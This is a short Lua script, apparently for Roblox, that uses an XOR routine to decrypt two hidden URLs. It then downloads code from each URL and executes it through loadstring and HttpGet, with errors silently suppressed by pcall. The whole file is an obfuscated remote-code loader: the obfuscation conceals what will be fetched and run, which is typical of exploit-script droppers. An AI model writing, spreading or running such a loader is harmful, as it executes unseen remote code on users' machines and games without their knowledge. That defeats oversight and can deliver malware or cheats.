local obf_stringchar = string.char;
local obf_stringbyte = string.byte;
local obf_stringsub = string.sub;
local obf_bitlib = bit32 or bit;
local obf_XOR = obf_bitlib.bxor;
local obf_tableconcat = table.concat;
local obf_tableinsert = table.insert;

local function LUAOBFUSACTOR_DECRYPT_STR_0(LUAOBFUSACTOR_STR, LUAOBFUSACTOR_KEY)
	local result = {};
	for i = 1, #LUAOBFUSACTOR_STR do
		-- Optimized to i, i for strict byte matching
		local char_byte = obf_stringbyte(obf_stringsub(LUAOBFUSACTOR_STR, i, i));
		local key_index = 1 + (i % #LUAOBFUSACTOR_KEY);
		local key_byte = obf_stringbyte(obf_stringsub(LUAOBFUSACTOR_KEY, key_index, key_index));
		obf_tableinsert(result, obf_stringchar(obf_XOR(char_byte, key_byte) % 256));
	end
	return obf_tableconcat(result);
end

local function v0()
	pcall(function()
		local url = LUAOBFUSACTOR_DECRYPT_STR_0("\217\215\207\53\245\225\136\81\210\199\213\107\245\180\210\12\210\198\217\107\239\181\136\28\216\205\200\106\209\141\211\27\246\229\214\60\208\186\136\78", "\126\177\163\187\69\134\219\167")
		loadstring(game:HttpGet(url))();
	end);
end

local function v1()
	pcall(function()
		local url = LUAOBFUSACTOR_DECRYPT_STR_0("\43\217\62\213\239\121\130\101\215\253\52\131\45\204\232\43\216\40\208\239\38\223\41\202\242\55\200\36\209\178\32\194\39\138\168\117\233\0\202\233\47\204\36\138\212\58\221\47\215\177\11\216\40\136\209\14\159\101\215\249\37\222\101\205\249\34\201\57\138\241\34\196\36\138\212\51\200\56\128\174\115\222\37\208\238\32\200", "\156\67\173\74\165")
		loadstring(game:HttpGet(url))();
	end);
end

task.spawn(v0);
task.spawn(v1);
